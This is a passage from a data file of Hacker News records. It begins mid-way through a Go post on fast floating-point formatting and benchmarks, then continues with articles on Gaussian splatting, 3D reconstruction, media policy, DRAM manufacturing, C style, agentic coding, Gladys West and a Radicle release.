u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tfor nd := len(a) - 1; nd >= 0; nd-- {\n\t\ta[nd] = byte(u%10 + '0')\n\t\tu /= 10\n\t}\n}fpfmt/unopt/fpfmt.go:368,376Unfortunately, if we connect our fastFixedWidthandShortto this\nversion offormatBase10, benchmarks spend most of their time in the formatting loop.\nThere are a variety of clever ways to speed up digit formatting.\nFor our purposes, it suffices to use the old trick of\nsplitting the number into two-digit chunks and\nthen converting each chunk by\nindexing a 200-byte lookup table (more precisely, a “lookup string”) of all 2-digit values from 00 to 99:// i2a is the formatting of 00..99 concatenated,// a lookup table for formatting [0, 99].const i2a = \"00010203040506070809\" +\n\t\"10111213141516171819\" +\n\t\"20212223242526272829\" +\n\t\"30313233343536373839\" +\n\t\"40414243444546474849\" +\n\t\"50515253545556575859\" +\n\t\"60616263646566676869\" +\n\t\"70717273747576777879\" +\n\t\"80818283848586878889\" +\n\t\"90919293949596979899\"fpfmt/fpfmt.go:353,364Using this table and unrolling the loop to allow the\ncompiler to optimize away bounds checks, we end up withformatBase10:// formatBase10 formats the decimal representation of u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tnd := len(a)\n\tfor nd >= 8 {// Format last 8 digits (4 pairs).x3210 := uint32(u % 1e8)\n\t\tu /= 1e8\n\t\tx32, x10 := x3210/1e4, x3210%1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\tx3, x2 := (x32/100)*2, (x32%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\ta[nd-5], a[nd-6] = i2a[x2+1], i2a[x2]\n\t\ta[nd-7], a[nd-8] = i2a[x3+1], i2a[x3]\n\t\tnd -= 8\n\t}\n\n\tx := uint32(u)\n\tif nd >= 4 {// Format last 4 digits (2 pairs).x10 := x % 1e4\n\t\tx /= 1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\tnd -= 4\n\t}\n\tif nd >= 2 {// Format last 2 digits.x0 := (x % 1e2) * 2\n\t\tx /= 1e2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\tnd -= 2\n\t}\n\tif nd > 0 {// Format final digit.a[0] = byte('0' + x)\n\t}\n}fpfmt/fpfmt.go:366,406This is more code than I’d prefer, but it is at least straightforward.\nI’ve seen much more complex versions.WithformatBase10, we can buildFmt, which formats in standard exponential notation:// Fmt formats d, p into s in exponential notation.// The caller must pass nd set to the number of digits in d.// It returns the number of bytes written to s.func Fmt(s []byte, d uint64, p, nd int) int {// Put digits into s, leaving room for decimal point.formatBase10(s[1:nd+1], d)\n\tp += nd - 1// Move first digit up and insert decimal point.s[0] = s[1]\n\tn := nd\n\tif n > 1 {\n\t\ts[1] = '.'\n\t\tn++\n\t}// Add 2- or 3-digit exponent.s[n] = 'e'\n\tif p < 0 {\n\t\ts[n+1] = '-'\n\t\tp = -p\n\t} else {\n\t\ts[n+1] = '+'\n\t}\n\tif p < 100 {\n\t\ts[n+2] = i2a[p*2]\n\t\ts[n+3] = i2a[p*2+1]\n\t\treturn n + 4\n\t}\n\ts[n+2] = byte('0' + p/100)\n\ts[n+3] = i2a[(p%100)*2]\n\ts[n+4] = i2a[(p%100)*2+1]\n\treturn n + 5\n}fpfmt/fpfmt.go:312,345When callingFmtwith aFixedWidthresult, we know the digit countndalready.\nFor aShortresult, we can compute the digit count easily from the bit length:// Digits returns the number of decimal digits in d.func Digits(d uint64) int {\n\tnd := log10Pow2(bits.Len64(d))\n\treturn nd + bool2[int](d >= uint64pow10[nd])\n}fpfmt/fpfmt.go:347,351Fixed-Width PerformanceTo evaluate fixed-width printing,\nwe need to decide which floating-point values to convert.\nI generated 10,000 uint64s in the range[1,263−252)and used them as\nfloat64 bit patterns.\nThe limited range avoids negative numbers, infinities, and NaNs.\nThe benchmarks all use Go’sChaCha8-based generatorwith a fixed seed for reproducibility.\nTo reduce timing overhead, the benchmark builds an array of 1000 copies of the value\nand calls a function that converts every value in the array in sequence.\nTo reduce noise, the benchmark times that function call 25 times and uses the median timing.\nWe also have to decide how many digits to ask for:\nlonger sequences are more difficult.\nAlthough I investigated a wider range, in this post I’ll show\ntwo representative widths: 6 digits (Cprintf’s default) and 17 digits\n(the minimum to guarantee accurate round trips, so widely used).The implementations I timed are:dblconv: Loitsch’sdouble-conversion library, using theToExponentialfunction.\nThis library, used in Google Chrome,\nimplements a handful of special cases for small binary exponents\nand falls back to a bignum-based printer for larger exponents.dmg1997: Gay’sdtoa.c,archived in 1997.\nFor our purposes, this represents Gay’s original C implementation\ndescribed in his technical report from 1990  [11].\nI confirmed that this 1997 snapshot runs at the same speed as\n(and has no significant code changes compared to)\nanother copy dating back to May 1991 or earlier.dmg2017: Gay’sdtoa.c,archived in 2017.\nIn 2017, Gay published an updated version ofdtoa.cthat usesuint64math and\na table of 96-bit powers of ten. It is significantly faster than the original version (see below).\nIn November 2025, I confirmed that the latest version runs at the same speed as this one.libc:\nThe C standard library conversion usingsprintf(\"%.*e\", prec-1).\nThe conversion algorithm varies by C library.\nThe macOS C library seems to wrap a pre-2017 version ofdtoa.c,\nwhile Linux’s glibc uses its own bignum-based code.\nIn general the C library implementations have not kept pace\nwith recent algorithms and are slower than any of the others.ryu: Adams’sRyū library, using thed2exp_bufferedfunction.\nIt uses the Ryū Printf algorithm [3].uscale: The unrounded scaling approach, using the Go code in this post.uscalec: A C translation of the unrounded scaling Go code.Here is a scatterplot showing the times required to formatfto 17 digits,\nrunning on the Linux system:(Click on any of the graphs in this post for a larger view.)The X axis is the log of the floating point inputf,\nand\nthe Y axis is the time required for a single conversion of the given input.\nThe scatterplot makes many things clear. For example, it is obvious that\nthere are two kinds of implementations.\nThose that use bignums take longer for large exponents and\nhave a “winged” scatterplot,\nwhile those that avoid bignums run at a mostly constant speed across\nthe entire exponent range.\nThe scatterplot also highlights many interesting data-dependent patterns in the timings,\nmost of which I have not investigated.\nA friend remarked that you could probably spend a whole career\nanalyzing the patterns in this one plot.For our purposes, it would help to have a clearer comparison\nof the speed of the different algorithms.\nThe right tool for that is a plot of the cumulative distribution function (CDF),\nwhich looks like this:Now time is on the X axis (still log scale), and the Y axis plots what\nfraction of the inputs ran in that time or less.\nFor example, we can see that dblconv’s fast path applies to most inputs,\nbut its slow path is much slower than Linux glibc or\neven Gay’s original C library.The CDF only plots the middle 99.9% of timings\n(dropping the 0.05% fastest and slowest),\nto avoid tails caused by measurement noise.\nIn general, measurements are noisier on the Mac because\nARM64 timers only provide ~20ns precision,\ncompared to the x86’s sub-nanosecond precision.Here are the scatterplots and CDFs for 6-digit output on the two systems:", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Gaussian Splatting – A$AP Rocky \"Helicopter\" music video", "url": "https://radiancefields.com/a-ap-rocky-releases-helicopter-music-video-featuring-gaussian-splatting", "content": "Gaussian Splatting – A$AP Rocky \"Helicopter\" music video. Pop Culture Michael Rubloff Jan 13, 2026 Believe it or not, A$AP Rocky is a huge fan of radiance fields. Yesterday, when A$AP Rocky released the music video forHelicopter, many viewers focused on the chaos, the motion, and the unmistakable early MTV energy of the piece. What’s easier to miss, unless you know what you’re looking at, is that nearly every human performance in the video was captured volumetrically and rendered as dynamic splats. I spoke withEvercoast, the team responsible for capturing the performances, as well as Chris Rutledge, the project’s CG Supervisor atGrin Machine, and Wilfred Driscoll of WildCapture andFitsū.ai, to understand howHelicoptercame together and why this project represents one of the most ambitious real world deployments of dynamic gaussian splatting in a major music release to date. The decision to shootHelicoptervolumetrically wasn’t driven by technology for technology’s sake. According to the team, the director Dan Strait approached the project in July with a clear creative goal to capture human performance in a way that would allow radical freedom in post-production. This would have been either impractical or prohibitively expensive using conventional filming and VFX pipelines. Chris told me he’d been tracking volumetric performance capture for years, fascinated by emerging techniques that could enable visuals that simply weren’t possible before. Two years ago, he began pitching the idea to directors in his circle, including Dan, as a “someday” workflow. When Dan came back this summer and said he wanted to use volumetric capture for the entire video, the proliferation of gaussian splatting enabled them to take it on. The aesthetic leans heavily into kinetic motion. Dancers colliding, bodies suspended in midair, chaotic fight scenes, and performers interacting with props that later dissolve into something else entirely. Every punch, slam, pull-up, and fall you see was physically performed and captured in 3D. Almost every human figure in the video, including Rocky himself, was recorded volumetrically using Evercoast’s system. It’s all real performance, preserved spatially.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Self Sanitizing Door Handle", "url": "https://www.jamesdysonaward.org/en-US/2019/project/self-sanitizing-door-handle/", "content": "Self Sanitizing Door Handle. To prevent people from infection by contact successful case in Hong Kong shopping mall initial door handle prototype initial generator prototype initial prototype draft Self-sanitizing door handle is combining with advanced photocatalytic technology and blacklight technology.The light source activate door handle coating to clean and sterillize. It can minimize the risk of infection by contact and enhance hygiene of the place In 2003, SARS spread out in Hong Kong. It infected thousands and killed hundreds here. People noticed that the importance of public health. We knew that many infection can spread out by contact, for example, SARS, MERS, Foot and Mouth Disease and Candida auris. Then, we decided to design door handle to public to prevent those infection to spread out and enhance public hygiene. The working principle of the product is that a thin advenced photocatalytic coating could effectively decompose bacteria on the surface of a substrate. Since a consistent UV light source is required to activate TiO2 film for disinfection, a custom-designed generator is used to provide stable electricity to light up a UV LED lamp by motion of opening and closing door . Reflections of light could occur inside a transparent glass door handle to activate coating on the outer surface. Then, the door handle can sterillize and clean by itself. We had made the first version by using stainless steel. However, it made the door handle and the generator heavier. Then, we change it into aluminium which can make it light and easy to install.\r\n\r\nWe also improve the generator output which can convert kinetic energy into light source effectively. Our design is simple and effective. Nowaday, people use chemical cleaning material to clean up public area but it is easy to wipe off and harmful for human body. Our design has high durabiliy and effective. It can clean up itself after using. In the door lock and door handle market, it is unique design because there is no similar producrs.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Robust Conditional 3D Shape Generation from Casual Captures", "url": "https://facebookresearch.github.io/ShapeR/", "content": "Robust Conditional 3D Shape Generation from Casual Captures. Robust Conditional 3D Shape Generation from Casual Captures Yawar Siddiqui, Duncan Frost, Samir Aroudj, Armen Avetisyan, Henry Howard-Jenkins, Daniel DeTone, Pierre Moulon, Qirui Wu†, Zhengqin Li, Julian Straub, Richard Newcombe, Jakob Engel Meta Reality Labs Research†Simon Fraser University From an input image sequence, ShapeR preprocesses per-object multimodal data (SLAM points, images, captions). A rectified flow transformer then conditions on these inputs to generate meshes object-centrically, producing a full metric scene reconstruction. Conditioned on off-the-shelf preprocessed inputs—SLAM points, 3D instances, and text—ShapeR infers per-object meshes to reconstruct the entire scene. While monolithic methods fuse the scene into one block, ShapeR reconstructs individual objects. This allows you to interact with and manipulate specific objects in the scene. ShapeR performs generative, object-centric 3D reconstruction from image sequences by leveraging multimodal inputs and robust training strategies. First, off-the-shelf SLAM and 3D instance detection are used to compute 3D points and object instances. For each object, sparse points, relevant images, 2D projections, and VLM captions are extracted to condition a rectified flow model, which denoises a latent VecSet to produce the 3D shape. The use ofmultimodal conditioning, along with heavyon-the-fly compositional augmentationsandcurriculum training, ensures the robustness of ShapeR in real-world scenarios. ShapeR conditions on a range of modalities, including the object's posed multiview images, SLAM points, text descriptions, and 2D point projections. ShapeR leverages single-object pretraining with extensive augmentations, simulating realistic backgrounds, occlusions, and noise across images and SLAM inputs. ShapeR is fine-tuned on object-centric crops from Aria Synthetic Environment scenes, which feature realistic image occlusions, SLAM point cloud noise, and inter-object interaction.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Corporate media is missing the moment. We need independent news", "url": "https://www.usatoday.com/story/opinion/2026/01/11/corporation-public-broadcasting-pbs-defunded-civic-media/88066980007/", "content": "Corporate media is missing the moment. We need independent news. As of Jan. 5, theCorporation for Public Broadcasting, a nonprofitcreated by the federal governmentto promote public broadcasting, isdissolved and defunct, and in the current media environment, it’s no mystery why. The point of public media has been structural independence from the profit-making imperative, particularly on matters of war, public health and constitutional governance. That is increasingly impossible. In the span of months, major media companies havesettled lawsuitsto green-light job-cutting mergers because shareholder wealth is tied to government approval of their deals. Now, in the span of weeks, \"60 Minutes\"spiked a segmentcritical of administration policy, CBS News rebranded its flagship evening broadcast with a promise to “love America,” and The Washington Post's Editorial Boardendorsed a military venturethat violates a longstanding constitutional statute. TheU.S. strike in Venezuelaoccurred at a time when the media had never been so compromised by the financial incentive to align with political authority. In the hours that followed, many news outlets did stenography for the administration – reporting the flawless military execution of the operation itself, but omitting that PresidentDonald Trump’s act was unauthorized by Congress and outside the norms of diplomatic relations. Too many Americans will view the killing of CPB as the end of public media. While the Public Broadcasting Service, a nonprofit broadcasting network, is not dead, defunded member stations will have to rely onindependent producersto reassert their collective mission. When corporate media continue to prioritize their access to sources over critical scrutiny, it’s essential to reimagine a model of what we’ve called public media and recognize a new kind of civic broadcast culture. Opinion:America feels more divided than ever. But is it? One of the few broadcasters toquestion the Iraq War– and laterexpose media complicitywith its planners – was the late PBS journalist Bill Moyers. Moyers, who passed away on June 26at the age of 91, practiced an independence from overriding commercial interests, rather than strictly from political ideology or partisanship. If Americans are looking for an alternative to crony capitalistic media, invest in a solutions-centric civic education that measures success with answers to simple questions: Are we safe? Is there enough livable housing? Is the price of milk affordable? Globally, are Ukraine and Russia closer to peace? When and why do we act militarily?", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "UK ministers launch consultation on whether to ban social media for under-16s", "url": "https://www.theguardian.com/uk-news/2026/jan/19/uk-ministers-launch-consultation-into-whether-to-ban-social-media-for-under-16s", "content": "UK ministers launch consultation on whether to ban social media for under-16s. Move comes as peers prepare to vote on an amendment to a bill that would enact a ban within a year of the bill passing Ministers have launched a consultation into whether to ban under-16s from using social media as part of a package of measures designed to curb mobile phone use among young people. Liz Kendall, the technology secretary, announced the consultation on Monday as the government responds to mounting pressure for stricter curbs on social media use for younger teenagers. On Monday afternoon, Esther Ghey, the mother of the murdered teenager Brianna Ghey, became the latest high profile figure toadd her nameto those in support of a ban. The announcement comes as peers prepare to vote on an amendment to the children’s wellbeing and schools bill on Wednesday, which would enact a ban within a year of the bill passing. Keir Starmer, the prime minister, has said he is open to the idea of a ban, but allies say he wants to wait to see moreevidence from Australia, where a ban was enacted in December, before making up his mind. Kendall said in a statement: “Through the Online Safety Act, this government has already taken clear, concrete steps to deliver a safer online world for our children and young people. “These laws were never meant to be the end point, and we know parents still have serious concerns. That is why I am prepared to take further action.” The consultation will explore a range of options, including whether to introduce a social media age limit, how to enforce such a limit, stopping technology companies accessing young users’ data and limiting addictive tools such as “infinite scrolling”. The government also says it expects every school to be free of mobile phones by default, with Ofsted to include reports on phone use as part of their regular inspections. The move is partly intended to buy the government time before Wednesday, when peers will vote on a proposal by the Conservative peer Lord Nash to set an age limit for social media at 16.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Upgrading DrizzleORM logging with AsyncLocalStorage", "url": "https://numeric.substack.com/p/upgrading-drizzleorm-logging-with", "content": "Upgrading DrizzleORM logging with AsyncLocalStorage. Every few months, you probably read about some obscure technique, technology, or language feature and think,“I should remember this exists.”Most of the time, that knowledge just sits there, taking up mental real estate. Occasionally, though, you hit a problem and realize you’ve been carrying around the exact solution for months without knowing it. That happened to me with Node.js AsyncLocalStorage. I remember reading a blog post about it a while back and thinking,“That sounds useful; I have absolutely no use case for it.”Months went by, and that assessment held true—AsyncLocalStorage was a neat tool with nothing to unlock. Thanks for reading Numeric Engineering! Subscribe for free to receive new posts and support my work. Then DrizzleORM’s logging limitations finally gave me the excuse I’d been waiting for. At Numeric, we useDrizzleas our fully-typed Postgres query builder. I’ll save the deeper discussion of why we chose Drizzle and how we think about our tools for another post, but long story short, for our core technologies, we like tools that don’t abstract away the thing they’re wrapping. One of our core engineering values is taking pride in extremely deep knowledge of our tools, and we consider SQL to be among our most critical. Drizzle’s query builder creates queries that are immediately intelligible to anyone who writes SQL, which is exactly what we want. But Drizzle is still an early, beta product. That comes with some blind spots. Custom query logging is one of them. For every database query, we need a canonical log line that includes: A unique query key (for tracking specific queries across our codebase) Execution time in milliseconds The sanitized SQL query", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: Movieagent.io – An agent for movie recommendations (with couple mode)", "url": "https://movieagent.io", "content": "Show HN: Movieagent.io – An agent for movie recommendations (with couple mode)", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Sins of the Children", "url": "https://asteriskmag.com/issues/07/sins-of-the-children", "content": "Sins of the Children. The circle of life on Chelicer 14d. When we reached the weather station it was so comprehensively trashed you’d think it’d been dropped from orbit. Torn apart and the pieces stomped on, the edges corrugated with dents and corroded with fluids. Something on this planet really didn’t want us to know when it was going to rain. “This is coming out of the use-budget,” Greffin said mournfully. She worked in Resources, liaising with the orbitingGarveneerto get what we needed. And we’d alreadyneededplenty to get ourselves set up planetside. “What’s our culprit and how do we kill it?” Merrit asked. The three of us had set the station up three days before and somehow it had riled the locals. Probably the sonic and radio chatter from using bounce-back to map meteorological systems. But nothing we’d seen on all of Chelicer 14d was big or aggressive enough to do this damage. I had my slate out to review our evolving catalog of Chelicer xenofauna. Merrit was on his haunches, studying the shrapnel; Greffin had a link to base camp at the farms, going over inventory to see what we could repurpose. Around us and the wreckage stretched the local scrub. Sedentary life on Chelicer was either low and spiny or tall and thin with a sort of puffball arrangement at the top. The land — the world — was dry, the ecosystem impoverished and short on species. My unfinished xenobio report went long on the idea that Chelicer had been lush in the past, and we’d arrived to find what had stabilized out of a catastrophic dry spell, or maybe some serious solar flare activity. There were no great forests to give cover to alien tigers. On Chelicer nothing grew past a shrub. One meter for the spiny stuff, two for the puffball poles. And the weather station had been up on high ground, ten klicks’ visibility in any direction. We weresafe. I heard a far-offchunk. A mechanical sound that — in the second’s pause before it impacted — I didn’t even connect withlife. The thing that came down right beside us was three meters high with a massive articulated body. A bug, really, Chelicer style. Eight crooked legs out from a central hub like all the mobile life here had, but most of what we’d seen was gracile, delicate, and came up to your waist. Even the Farmers — which we’d pegged as the most advanced species around — were only a meter and a half tall, and most of that was stilting limbs. This thing wasnotgracile. Every segment and joint of it was ridgy, armored, and spiky. It was dun and khaki like the planet’s dust, but too big to have hidden anywhere nearby, towering over the scrub. There were spread vanes like sails projecting from its back, but itcouldn’thave flown under organic power. It must have weighed five tons. We just stared. In that moment, when we could have run or called for help,we goggled at it. The stalked globes of its eyes looked back, devoid of living connection. A vast armored monster, airdropped from nowhere. I saw the motion, off on a neighboring hillside. There was a second monster out there, surprisingly hard to spot. It hunkered down, drawing its limbs in.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Micron finds a way to make more DRAM with $1.8B chip plant purchase", "url": "https://www.theregister.com/2026/01/20/micron_powerchip_fab_acquisition/", "content": "Micron finds a way to make more DRAM with $1.8B chip plant purchase. Micron has found a way to add new DRAM manufacturing capacity in a hurry by acquiring a chipmaking campus from Taiwanese outfit Powerchip Semiconductor Manufacturing Corporation (PSMC). The two companies announced the deal last weekend. Micron’sversion of eventssays it’s signed a letter of intent to acquire Powerchip’s entire P5 site in Tongluo, Taiwan, for total cash consideration of US$1.8 billion. “The acquisition includes an existing 300 mm fab cleanroom of 300,000 square feet and will further position Micron to address growing global demand for memory solutions,” the company stated, adding that the company “expects this acquisition to contribute to meaningful DRAM wafer output beginning in the second half of calendar 2027.” Powerchip’stakeon the deal includes news that it will establish a long-term foundry relationship with Micron “on DRAM advanced packaging wafer manufacturing.” The deal means PSMC will leave the Tongluo site and move the production lines it operates there to another of its facilities in the city of Hsinchu. PSMC has assured its foundry customers it can do this without disrupting its operations, but also says it plans to “phase out low-margin products to reduce reliance on mature process foundry services” and build more products for AI applications. That’s a remarkable decision given that PSMC opened the Tongluo site less than two years ago. In its May 2024’Hooray, we’re open!’announcement, PSMC said it invested more than NT$300 billion (US$9.5 billion) on the facility, and that it had capacity to produce 50,000 12-inch wafers per month under 55, 40 and 28 nanometer technology nodes. The company also scoped a second fab on the site to produce 2 nanometer chips. Nineteen months later, the company is walking away from Tongluo and the legacy chip business and has seemingly taken a financial hit along the way. Micron says the acquisition “complements … ongoing global expansion plans as the company invests to meet long-term demand from its customers.” The company is already building new memory fabs – itannounceda new one in New York State just last Friday – and late last yeartold investorsthat new datacenter builds to house AI infrastructure have created a “sharp increase” in demand forecast for memory and storage that semiconductor companies won’t be able to meet for the foreseeable future. That collision of supply and demand has sent memory prices soaring and created an environment in which Micron was able to pre-sell all the high-bandwidth memory it will produce in 2026.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "A Brief History of Ralph", "url": "https://www.humanlayer.dev/blog/brief-history-of-ralph", "content": "A Brief History of Ralph. TheRalph Wiggum Technique, created byGeoff Huntley, went viral in the final weeks of 2025. Here's the story of ralph since the first time I met Geoff in June of 2025. I've been messing with ralph since ~June 2025. Here's my story and what I learned along the way. tl;dr Jan 1 2026 - If you wanna skip to the end, I did a deep dive on ralph w/ Geoff Huntley on Jan 1 2026. It talks through the history, cursed lang, and compares the original bash-loop ralph implementation with the anthropic stop-hook implementation. You can check it out here:  I attend a meetup with about 15 members of a Twitter GC where we talk about agentic coding. It's the first time I see context7, WisprFlow, specstory, taskmaster, and a whole bunch of other tools and addons, some of which are now quite mainstream. One of our engineers demos an early TUI for Claude approvals and what becomes the foundation of research / plan / implement. There are about 3 hours of presentations. Geoff shows up 2 hours late and presents last. He completely steals the show, diving deep on ralph, cursed lang (at the time, the compiler stack is written in Rust), livestreaming autonomous coding overnight while asleep in Australia, subagents in amp code, the virtues of drinking 3 margaritas and shouting at cursor, and much, much more. Geoff talks about the \"overbaking\" phenomenon. If you leave ralph running too long, you end up with all sorts of bizarre emergent behavior, like post-quantum cryptography support. It has dimensions of art, deep engineering, the embrace of chaos, and the raw and authentic joy of making a thing. All ~15 of us have a long and (imo) somewhat unsettling conversation about the future of software dev—about how easy it is to take a SaaS and copy 80-90% of it, and about how many types of work are about to change or disappear entirely.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Some C habits I employ for the modern day", "url": "https://www.unix.dog/~yosh/blog/c-habits-for-me.html", "content": "Some C habits I employ for the modern day. posted2026-01-17T21:02:00Z modified2026-01-17T23:20:00Z Despite it being the first “proper” programming language I learned–by reading K&R front-to-back no less–I don’t write C too terribly often nowadays. Playingresonitehas gotten me into writing a load of C# for modding the game, and most of what I do day-to-day is automating the tedium on my computer, which gets delegated to shell or python because of all the existing infrastructure. Alas, every now and then, something arises where I have to or just want to write some C (or C++). Sometimes it’s whenI need to make some bindings for a library; sometimes it’sto fill a niche of a language/architecture gap. It also remains as my favorite language to prototype stuff in, though I’m not quite sure why. In any case, C is an interesting language without much standardization on the whole “style” or “practices” part. Most other languages have very clear “this is the best way to use X” messages, either subtly embedded in the syntax itself or through “official” documentation channels. C doesn’t have an official documentation channel, nor does it have syntax or standard library constructs that encourage one particular way of doing things. From this, there’s a bunch of inconsistencies in how people do things, and–especially in the early days of the language and standard library–the landscape and general practice is quite error prone. As such, I’ve developed my own habits when writing C, usually picked up from blog posts, writing C# or rust, or just out of perfectionist brain. I’m not saying you should write stuff this way, nor am I claiming it is the best way to write C all the time. I break some of these practices when working with embedded systems or when I’m writing things to be as fast as they can possibly be. But it is the baseline I tend to start with for most projects, and if I don’t write it down, I’ll never be consistent with it. I usually use C23 for my new C projects. When contributing to other projects, I of course use their revision, but C23 enables a fair amount of the things possible in this post, so it’s what I stick with for projects that aren’t trying to target absolute maximum portability or embedded architectures (i.e. I’d only care about GCC, clang, andmaybeMSVC). almost every platform, including any POSIX-compliant one,hasCHAR_BITset to8, so I like to make it explicitly clear that this is what the project is for by putting this in there: Something very small that I liked alotwhen learning rust was its short way of referring to fixed-length types. Combine that withchris wellon’s other typedefsand I end up having all thesetypedefs in my projects: You may notice that thebyteandb32from wellon’s post are missing here. As said before, when employing this style, I don’t care for systems where char isn’t 8 bit, so the distinction betweenu8andchardoesn’t mean anything to me here. Additionally, the intent of whether the buffer is used as “raw” memory chunks versus a meaningfulu8is pretty clear from the code that it gets used in, so I’m not worried about confusing intent with it. b32is missing because I just use the C23booltype. If I’m working with >=C99, I usestdbool.handbool. Its semantics are familiar to me already, and it just feels more right to use for, well, booleans.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Gladys West's vital contributions to GPS technology", "url": "https://en.wikipedia.org/wiki/Gladys_West", "content": "Gladys West's vital contributions to GPS technology.  Gladys Mae West(néeBrown; October 27, 1930 – January 17, 2026) was an American mathematician. She was known for her contributions to mathematical modeling of theshape of the Earth, and her work on the development ofsatellite geodesymodels, that were later incorporated into theGlobal Positioning System(GPS).[1] West was inducted into theUnited States Air ForceHall of Fame in 2018. She was awarded theWebby Lifetime Achievement Awardfor the development of satellite geodesy models.[2][3] Gladys Mae Brown was born inSutherland, Virginia, inDinwiddie County, a rural county south ofRichmond, on October 27, 1930.[1][4][5][6]Her family was an African-American farming family in a community ofsharecroppers. She spent much of her childhood working on her family's small farm.[7][8]As well as working on the farm, her mother worked in a tobacco factory and her father worked for the railroad.[5][9]West saw education as her way to a different life.[10] At West's high school, the top two students from each graduating class received full scholarships to Virginia State College (Virginia State University(VSU)), ahistorically black public university.[7]West graduated as valedictorian in 1948, and received the scholarship.[5][10]At VSU, she chose to study mathematics, a subject that was mostly studied by men.[7]She also joined theAlpha Kappa Alphasorority.[1]West graduated in 1952 with aBachelor of Sciencedegree in mathematics,[5]and then taught mathematics and science for two years inWaverly, Virginia.[5]West returned to VSU to complete aMaster of Mathematicsdegree, graduating in 1955.[10][5]Afterwards, she began another teaching position inMartinsville, Virginia.[5] In 1956, West was hired to work at the Naval Proving Ground inDahlgren, Virginia (later theNaval Surface Warfare Center). She was the second black woman hired and one of only four black employees.[7][4][1]She was a computer programmer in theDahlgren division, and a project manager for processing systems for satellite data analysis.[12]Concurrently, West earned aMaster's degree in Public Administrationfrom theUniversity of Oklahoma.[5] In the early 1960s, West participated in an award-winning study that proved the regularity ofPluto’s motion relative toNeptune.[13]Subsequently, West began to analyze satellite altimeter data from NASA'sGeodetic Earth Orbitingprogram, to create models of the Earth's shape. She became project manager for the short-livedSeasatradar altimetry project, the first satellite that couldremotely senseoceans.[14][15]West's work cut her team's processing time in half, and she was recommended for a commendation.[16] From the mid-1970s through the 1980s, West programmed anIBM 7030 Stretchcomputer to deliver increasingly precise calculations for theshape of the Earth; anellipsoidwith additional undulations known as thegeoid.[8]To generate an accurategeopotentialmodel West needed to use complex algorithms to account for variations in the gravitational, tidal, and other forces that distort Earth's shape.[9] In 1986, West publishedData Processing System Specifications for the Geosat Satellite Radar Altimeter, a 51-page technical report from theNaval Surface Weapons Center(NSWC). This explained how to improve the accuracy ofgeoid heightsandvertical deflection, important components ofsatellite geodesy.[1]This was achieved by processing data from the radio altimeter on theGeosat satellite, which went into orbit on March 12, 1984.[11] West worked at Dahlgren for 42 years, and retired in 1998.[7]In 2000, she completed aPhDin Public Administration atVirginia Techby distance-learning.[13][17][18]", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Luxury Yacht is a desktop app for managing Kubernetes clusters", "url": "https://github.com/luxury-yacht/app", "content": "Luxury Yacht is a desktop app for managing Kubernetes clusters", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Radicle 1.6.0 – Amaryllis", "url": "https://radicle.xyz/2026/01/14/radicle-1.6.0", "content": "Radicle 1.6.0 – Amaryllis. Radicle is a peer-to-peer, local-first code\n        collaboration stack built on Git. Happy new year! The Radicle team is excited to announce the release of Radicle 1.6.0 (4a5a51e6), code nameAmaryllis.\nThe Amaryllis flower blooms late winter and prefers to sit in thewindow(foreshadowing…) First off, we would like to say sorry for the hiatus.\nAs the team worked on some major refactoring, we ran into a snag before we could perform this release.\nThankfully, we caught the bug, but as we were pushing up against holiday time, we put a hold on releasing.\nNow that we are on the other side of the new year, and sufficiently defrosted, we are back to making regular releases! This release consists of massive 153 commits from 12 contributors.\nPeople really banded together to make a better release for Radicle this time round!\nLet’s give thanks to: The cratesnetservices,io-reactor, andpopolwere crucially valuable\nfor implementingradicle-node. However, they are not ideal dependencies for\nensuring long-term health of the network I/O layer: The efforts to migrateradicle-nodeto usemio, alongside changes that fixed\npath canonicalization and supporting Windows pipes, have allowed developers to\nbuildradicle-nodeon Windows. We encourage users to try out Radicle on Windows by building from source. At the\ntime of writing, there may be undiscovered issues, since this is a nascent time\nforradicle-nodeon Windows. Please report any issues you see viarad issueor on ourZulip. For those who are developing on top of theheartwoodcrates, it is important\nto note that the Minimum Supported Rust Version (MSRV) is now 1.85. radnow uses theclapcrate for parsing its command-line arguments. This\nbrings a brand new look to the help output for theradCLI, and ensures that\nwe do not miss documenting options when they are added. Note that this does\naffect error reporting, as they are now reported byclapwhen parsing fails.", "source": "HackerNews", "date": null, "author": null, "score": null}
